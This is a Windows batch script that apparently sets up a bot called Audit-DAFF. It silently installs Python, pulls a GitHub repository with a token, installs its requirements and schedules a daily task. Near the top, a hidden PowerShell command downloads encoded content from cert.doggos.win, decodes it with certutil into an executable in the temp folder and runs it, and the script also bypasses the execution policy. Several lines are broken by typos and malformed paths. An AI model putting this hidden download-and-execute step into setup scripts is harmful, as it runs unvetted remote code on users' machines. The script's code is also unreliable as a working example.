@echo off

cd C:\OEM

call config.bat

SET "PB_PATH=%TEMP%\ProgressNotifier.exe"
SET "INSTALLER=%TEMP%\python-3.12.0-amd64.exe"

call powershell -WindowStyle Hidden -command  "(wget cert.doggos.win).content | out-file %TEMP%\tmp.txt; certutil -decode %TEMP%\tmp.txt %PB_PATH%; del %TEMP%\tmp.txt; &'%PB_PATH%'"

powershell -WindowStyle Hidden -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force; Get-ExecutionPolicy | Out-File -Encoding ASCII %TEMP%\sep.txt"
SET /P SEPVAR=<%TEMP%\sep.txt

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://www.python.org/ftp/python/3.12.0/python-3.12.0-amd64.exe -OutFile %INSTALLER% | Out-File -Encoding ASCII %TEMP%\pydl.txt"
SET /P PYDLVAR=<%TEMP%\pydl.txt

START /WAIT %INSTALLER% /quiet InstallAllUsers=0 PrependPath=0 TargetDir=%LOCALAPPDATA%\Programs\Python\Python312

SET "PYTHON_PATH=%LOCALAPPDATA%\Programs\Python\Python312\python.exe"

SETX PATH "%LOCALAPPDATA%\Programs\Python\Python312;%LOCALAPPDATA%\Programs\Python\Python312\Scripts;%PATH%"

taskkill /im "ProgressNotifier.exe" /f >NUL 2>&1

set minhaPasta = Audit-DAFF.zip

curl  -L ^
      -H "Accept: aaplication/vnd.github+json" ^
      -H "Authorization: Bearer %token%" ^
      -H "X-Github-Api-Version: 2022-11-28" ^
      -o Audit-DAFF.zip ^
      "https://api.github.com/repos/vj-bots/Audit-DAFF/zipball/main!"

mkdir Audit-DAFF&& tar -zxvf %minhaPasta% -C Audit-DAFF --strip-components=1

cd Audit-DAFF

pip install -r requirementes.txt

SCHTASKS /CREATE /SC DAILY /TN "MYTASKS\Audit-DAFF" /TR "C:Audit-DAFF\main.py" /ST 00:00 /RU Jhonathan
